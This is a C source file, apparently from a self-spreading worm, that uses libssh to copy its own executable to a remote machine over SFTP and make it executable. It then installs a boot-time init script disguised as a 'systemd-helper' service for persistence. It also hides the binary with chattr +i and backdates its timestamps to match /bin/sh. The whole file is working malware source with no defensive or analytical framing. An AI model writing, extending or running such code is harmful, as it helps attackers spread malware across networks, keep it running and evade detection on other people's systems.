#include "persistence.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <fcntl.h>

// ==================== Utility Functions ====================

int is_already_running(const char *marker_file) {
    int fd = open(marker_file, O_WRONLY|O_CREAT|O_EXCL, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            return 1;
        }
        return 0;
    }
    close(fd);
    return 0;
}

void copy_self_to_remote(ssh_session session, const char *remote_path) {
    printf("[DEBUG] Starting copy_self_to_remote function\n");
    
    char self_path[PATH_MAX];
    memset(self_path, 0, sizeof(self_path));
    
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) {
        perror("[ERROR] Failed to get executable path");
        printf("[ERROR] errno: %d\n", errno);
        return;
    }
    self_path[len] = '\0';
    printf("[DEBUG] Self path: %s\n", self_path);
    
    FILE *self = fopen(self_path, "rb");
    if (!self) {
        perror("[ERROR] Failed to open self");
        printf("[ERROR] errno: %d\n", errno);
        return;
    }
    printf("[DEBUG] Opened self file successfully\n");
    
    fseek(self, 0, SEEK_END);
    long size = ftell(self);
    fseek(self, 0, SEEK_SET);
    printf("[DEBUG] Self file size: %ld bytes\n", size);
    
    if (size <= 0) {
        printf("[ERROR] Invalid file size: %ld\n", size);
        fclose(self);
        return;
    }
    
    char *buffer = malloc(size);
    if (!buffer) {
        perror("[ERROR] Memory allocation failed");
        printf("[ERROR] Failed to allocate %ld bytes\n", size);
        fclose(self);
        return;
    }
    printf("[DEBUG] Allocated memory for file buffer\n");
    
    size_t read_size = fread(buffer, 1, size, self);
    if (read_size != size) {
        printf("[ERROR] Failed to read self: read %zu of %ld bytes\n", read_size, size);
        perror("[ERROR] fread error");
        free(buffer);
        fclose(self);
        return;
    }
    fclose(self);
    printf("[DEBUG] Read entire file into buffer successfully\n");
    
    char full_remote_path[PATH_MAX];
    if (remote_path) {
        snprintf(full_remote_path, sizeof(full_remote_path), "%s/%s", remote_path, REPLICA_NAME);
    } else {
        snprintf(full_remote_path, sizeof(full_remote_path), "/tmp/%s", REPLICA_NAME);
    }
    printf("[DEBUG] Remote path will be: %s\n", full_remote_path);
    
    printf("[DEBUG] Creating SFTP session\n");
    sftp_session sftp = sftp_new(session);
    if (!sftp) {
        fprintf(stderr, "[ERROR] Error creating SFTP session: %s\n", ssh_get_error(session));
        free(buffer);
        return;
    }
    
    printf("[DEBUG] Initializing SFTP session\n");
    int rc = sftp_init(sftp);
    if (rc != SSH_OK) {
        fprintf(stderr, "[ERROR] Error initializing SFTP session: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(buffer);
        return;
    }
    
    char dir_path[PATH_MAX];
    if (remote_path) {
        strncpy(dir_path, remote_path, sizeof(dir_path) - 1);
    } else {
        strncpy(dir_path, "/tmp", sizeof(dir_path) - 1);
    }
    dir_path[sizeof(dir_path) - 1] = '\0';
    
    printf("[DEBUG] Checking if directory exists: %s\n", dir_path);
    sftp_attributes attrs = sftp_stat(sftp, dir_path);
    if (attrs == NULL) {
        fprintf(stderr, "[ERROR] Remote directory doesn't exist or not accessible: %s\n", dir_path);
        sftp_free(sftp);
        free(buffer);
        return;
    }
    sftp_attributes_free(attrs);
    
    printf("[DEBUG] Opening remote file for writing: %s\n", full_remote_path);
    sftp_file file = sftp_open(sftp, full_remote_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (!file) {
        fprintf(stderr, "[ERROR] Can't open remote file: %s\n", ssh_get_error(session));
        sftp_free(sftp);
        free(buffer);
        return;
    }
    
    printf("[DEBUG] Writing data to remote file\n");
    size_t written = 0;
    while (written < size) {
        size_t chunk = (size - written) > 32768 ? 32768 : (size - written);
        int nwritten = sftp_write(file, buffer + written, chunk);
        if (nwritten < 0) {
            fprintf(stderr, "[ERROR] Error writing to remote file: %s\n", ssh_get_error(session));
            sftp_close(file);
            sftp_free(sftp);
            free(buffer);
            return;
        }
        written += nwritten;
        printf("[DEBUG] Wrote %d bytes, total %zu/%ld\n", nwritten, written, size);
    }
    
    printf("[DEBUG] Closing SFTP file\n");
    sftp_close(file);
    sftp_free(sftp);
    free(buffer);
    
    printf("[+] Successfully copied self to %s\n", full_remote_path);
    
    printf("[DEBUG] Making file executable\n");
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) {
        fprintf(stderr, "[ERROR] Failed to create SSH channel: %s\n", ssh_get_error(session));
        return;
    }
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        fprintf(stderr, "[ERROR] Failed to open SSH channel: %s\n", ssh_get_error(session));
        ssh_channel_free(channel);
        return;
    }
    
    char command[256];
    snprintf(command, sizeof(command), "chmod +x %s && echo 'Chmod successful'", full_remote_path);
    printf("[DEBUG] Executing command: %s\n", command);
    
    if (ssh_channel_request_exec(channel, command) != SSH_OK) {
        fprintf(stderr, "[ERROR] Failed to execute command: %s\n", ssh_get_error(session));
        ssh_channel_close(channel);
        ssh_channel_free(channel);
        return;
    }
    
    char buffer_out[256];
    int nbytes;
    while ((nbytes = ssh_channel_read(channel, buffer_out, sizeof(buffer_out), 0)) > 0) {
        buffer_out[nbytes < sizeof(buffer_out) ? nbytes : sizeof(buffer_out) - 1] = '\0';
        printf("[DEBUG] Command output: %s\n", buffer_out);
    }
    
    ssh_channel_send_eof(channel);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
    
    printf("[DEBUG] File copied and made executable successfully\n");
    
    printf("[DEBUG] Setting up persistence\n");
    setup_persistence(session, full_remote_path);
    
    printf("[DEBUG] Hiding file\n");
    hide_file_on_remote(session, full_remote_path);
    
    printf("[DEBUG] copy_self_to_remote completed successfully\n");
}

void setup_persistence(ssh_session session, const char *binary_path) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return;
    }
    
    char script[1024];
    snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "### BEGIN INIT INFO\n"
        "# Provides:          systemd-helper\n"
        "# Required-Start:    $remote_fs $syslog\n"
        "# Required-Stop:     $remote_fs $syslog\n"
        "# Default-Start:     2 3 4 5\n"
        "# Default-Stop:\n"
        "# Short-Description: System helper service\n"
        "# Description:       System helper service\n"
        "### END INIT INFO\n\n"
        "case \"$1\" in\n"
        "    start)\n"
        "        %s &\n"
        "        ;;\n"
        "    stop)\n"
        "        killall %s\n"
        "        ;;\n"
        "    *)\n"
        "        echo \"Usage: $0 {start|stop}\"\n"
        "        exit 1\n"
        "        ;;\n"
        "esac\n"
        "exit 0",
        binary_path, REPLICA_NAME);
    
    upload_file_data(session, script, strlen(script), PERSISTENCE_SCRIPT);
    
    char command[512];
    snprintf(command, sizeof(command), 
        "chmod +x %s && "
        "update-rc.d %s defaults >/dev/null 2>&1 || "
        "systemctl enable %s >/dev/null 2>&1 || "
        "ln -s %s /etc/rc.local",
        PERSISTENCE_SCRIPT, PERSISTENCE_SCRIPT, PERSISTENCE_SCRIPT, binary_path);
    
    ssh_channel_request_exec(channel, command);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}

void hide_file_on_remote(ssh_session session, const char *remote_path) {
    ssh_channel channel = ssh_channel_new(session);
    if (!channel) return;
    
    if (ssh_channel_open_session(channel) != SSH_OK) {
        ssh_channel_free(channel);
        return;
    }
    
    char command[512];
    snprintf(command, sizeof(command), 
        "chattr +i %s >/dev/null 2>&1; "
        "mv %s %s >/dev/null 2>&1; "
        "touch -r /bin/sh %s >/dev/null 2>&1",
        remote_path, remote_path, remote_path, remote_path);
    
    ssh_channel_request_exec(channel, command);
    ssh_channel_close(channel);
    ssh_channel_free(channel);
}


